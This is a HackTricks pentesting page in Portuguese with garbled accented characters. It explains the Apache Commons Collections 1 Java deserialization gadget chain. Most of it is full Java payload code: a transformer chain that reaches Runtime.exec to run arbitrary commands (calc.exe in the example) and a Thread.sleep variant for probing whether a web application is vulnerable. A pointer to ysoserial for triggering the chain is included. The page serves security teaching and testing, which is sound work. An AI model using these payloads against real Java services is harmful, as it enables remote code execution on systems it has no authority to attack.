# Payload CommonsCollection1 - Transformadores Java para Rutime exec() e Thread Sleep

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Transformadores Java para Rutime exec()

Em vÃ¡rios lugares, vocÃª pode encontrar um payload de desserializaÃ§Ã£o Java que usa transformadores do Apache common collections como o seguinte:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Se vocÃª nÃ£o sabe nada sobre payloads de desserializaÃ§Ã£o em Java, pode ser difÃ­cil entender por que esse cÃ³digo executarÃ¡ uma calculadora.

Primeiramente, vocÃª precisa saber que um **Transformer em Java** Ã© algo que **recebe uma classe** e a **transforma em outra**.\
TambÃ©m Ã© interessante saber que o **payload** sendo **executado** aqui Ã© **equivalente** a:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
Ou **mais exatamente**, o que serÃ¡ executado no final serÃ¡:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### Como

EntÃ£o, como o primeiro payload apresentado Ã© equivalente a esses one-liners "simples"?

**Primeiro** de tudo, vocÃª pode notar no payload que uma **cadeia (array) de transformaÃ§Ãµes Ã© criada**:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
Se vocÃª ler o cÃ³digo, vocÃª notarÃ¡ que se vocÃª de alguma forma encadear a transformaÃ§Ã£o do array, vocÃª poderÃ¡ executar comandos arbitrÃ¡rios.

EntÃ£o, **como essas transformaÃ§Ãµes sÃ£o encadeadas?**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
Na Ãºltima seÃ§Ã£o do payload, vocÃª pode ver que um **objeto Map Ã© criado**. Em seguida, a funÃ§Ã£o `decorate` Ã© executada a partir de `LazyMap` com o objeto map e os transformers encadeados. A partir do cÃ³digo a seguir, vocÃª pode ver que isso farÃ¡ com que os **transformers encadeados** sejam copiados dentro do atributo `lazyMap.factory`:
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
E entÃ£o o grande final Ã© executado: `lazyMap.get("anything");`

Este Ã© o cÃ³digo da funÃ§Ã£o `get`:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
E este Ã© o cÃ³digo da funÃ§Ã£o `transform`
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
EntÃ£o, lembre-se de que dentro da **fÃ¡brica** tÃ­nhamos salvo **`chainedTransformer`** e dentro da funÃ§Ã£o **`transform`** estamos **passando por todos esses transformadores encadeados** e executando um apÃ³s o outro. O engraÃ§ado Ã© que **cada transformador estÃ¡ usando `object`** **como entrada** e **o objeto Ã© a saÃ­da do Ãºltimo transformador executado**. Portanto, **todos os transformadores sÃ£o encadeados executando a carga maliciosa**.

### Resumo

No final, devido Ã  forma como o lazyMap estÃ¡ gerenciando os transformadores encadeados dentro do mÃ©todo get, Ã© como se estivÃ©ssemos executando o seguinte cÃ³digo:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_Observe como `value` Ã© a entrada de cada transformaÃ§Ã£o e a saÃ­da da transformaÃ§Ã£o anterior, permitindo a execuÃ§Ã£o de um comando em uma linha:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
Note que aqui foi explicado os gadgets usados para o payload ComonsCollections1. Mas ficou em aberto como tudo isso comeÃ§a a ser executado. VocÃª pode ver [aqui que o ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), para executar esse payload, usa um objeto `AnnotationInvocationHandler` porque quando esse objeto Ã© desserializado, ele invocarÃ¡ a funÃ§Ã£o `payload.get()` que executarÃ¡ todo o payload.

## Java Thread Sleep

Esse payload pode ser Ãºtil para identificar se a web Ã© vulnerÃ¡vel, pois executarÃ¡ um sleep se for.
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## Mais Gadgets

VocÃª pode encontrar mais gadgets aqui: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
